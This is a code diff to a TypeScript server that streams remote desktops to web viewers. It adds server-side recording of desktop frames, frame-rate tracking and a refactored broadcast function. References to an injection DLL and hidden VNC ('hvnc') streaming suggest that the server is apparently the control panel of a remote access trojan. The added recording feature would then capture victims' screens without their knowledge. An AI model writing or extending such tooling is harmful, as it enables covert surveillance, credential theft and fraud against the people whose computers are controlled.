@@ -24,6 +24,12 @@ import {
   lookupP2PSession,
   type P2PSession,
 } from "./webrtc-p2p-sessions";
+import {
+  getRemoteDesktopRecordingStatus,
+  recordRemoteDesktopFrame,
+  startRemoteDesktopRecording,
+  stopRemoteDesktopRecording,
+} from "./rd-recording";
 
 let _cachedInjectionDll: Uint8Array | null = null;
 let _dllCachePath: string | null = null;
@@ -161,6 +167,7 @@ export const rdStreamingState = new Map<string, {
   codec: string;
   duplication: boolean;
   maxHeight: number;
+  lastFps: number;
 }>();
 const rdInputPending = new Map<string, { clientId: string; sentAt: number; kind: string }>();
 const RD_INPUT_TTL_MS = 10_000;
@@ -314,7 +321,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
     return;
   }
 
-  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0 };
+  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0, lastFps: 0 };
 
   logger.debug(`[rd] inbound viewer msg type=${payload.type} client=${clientId}`);
   switch (payload.type) {
@@ -365,6 +372,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       const otherViewers = sessionManager.getRdSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
       if (otherViewers.length === 0) {
+        stopRemoteDesktopRecording(clientId, "desktop stopped");
         sendDesktopCommand(target, "desktop_stop", {});
         sendDesktopCommand(target, "webrtc_stop", { kind: "desktop" });
         if (state.isStreaming) {
@@ -378,6 +386,46 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       } else {
         logger.debug(`[rd] ignoring desktop_stop for client ${clientId} - ${otherViewers.length} other viewer(s) still active`);
       }
+      break;
+    }
+    case "desktop_record_start": {
+      if (!state.isStreaming) {
+        safeSendViewer(ws, {
+          type: "recording_status",
+          recording: null,
+          error: "Start the remote desktop stream before recording.",
+        });
+        break;
+      }
+      const inputCodec = String(state.codec || "").toLowerCase() === "h264" ? "h264" : "mjpeg";
+      const compact = !!(payload as any).compact;
+      const requestedFps = Number((payload as any).fps) || 0;
+      logger.debug(`[rd] recording start requested client=${clientId} current_quality=${state.quality || 90} current_codec=${state.codec || "(default)"} current_duplication=${!!state.duplication} recorder_input=${inputCodec} compact=${compact} requested_fps=${requestedFps || "source"} source_fps=${state.lastFps || 0} stream_unchanged=true`);
+      if (inputCodec === "h264") {
+        sendDesktopCommand(target, "desktop_request_keyframe", {
+          reason: "server_recording",
+        });
+      }
+      const recording = startRemoteDesktopRecording({
+        clientId,
+        requestedByUserId: ws.data.userId,
+        requestedByUsername: (ws.data as any).username,
+        fps: requestedFps || undefined,
+        sourceFps: inputCodec === "h264" ? (state.lastFps || undefined) : undefined,
+        inputCodec,
+        compact,
+      });
+      safeSendViewer(ws, { type: "recording_status", recording });
+      break;
+    }
+    case "desktop_record_stop": {
+      logger.debug(`[rd] recording stop requested client=${clientId} current_quality=${state.quality || 90} current_codec=${state.codec || "(default)"} current_duplication=${!!state.duplication}`);
+      const recording = stopRemoteDesktopRecording(clientId, "stopped");
+      safeSendViewer(ws, { type: "recording_status", recording: recording || getRemoteDesktopRecordingStatus(clientId) });
+      break;
+    }
+    case "desktop_record_status": {
+      safeSendViewer(ws, { type: "recording_status", recording: getRemoteDesktopRecordingStatus(clientId) });
       break;
     }
     case "desktop_select_display": {
@@ -593,17 +641,30 @@ function handleRemoteDesktopFrame(payload: any) {
   const clientId = payload.clientId as string;
   const header = payload.header;
   const bytes = payload.data as Uint8Array;
-  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0 };
+  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0, lastFps: 0 };
   if (!state.isStreaming) {
-    rdStreamingState.set(clientId, { ...state, isStreaming: true });
+    state.isStreaming = true;
   }
+  const frameFps = Number(header?.fps) || 0;
+  if (frameFps > 0) state.lastFps = frameFps;
+  rdStreamingState.set(clientId, state);
+  broadcastRemoteDesktopFrame(clientId, bytes, header);
+}
+
+function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header?: any): boolean {
+  const frameFps = Number(header?.fps) || 0;
+  if (frameFps > 0) {
+    const state = rdStreamingState.get(clientId) || { isStreaming: true, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0, lastFps: 0 };
+    state.lastFps = frameFps;
+    rdStreamingState.set(clientId, state);
+  }
+  recordRemoteDesktopFrame(clientId, header, bytes);
   const buf = buildViewerFrameBuffer(bytes, header);
-  broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
+  return broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
 }
 
 (globalThis as any).__rdBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
-  const buf = buildViewerFrameBuffer(bytes, header);
-  return broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
+  return broadcastRemoteDesktopFrame(clientId, bytes, header);
 };
 
 export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
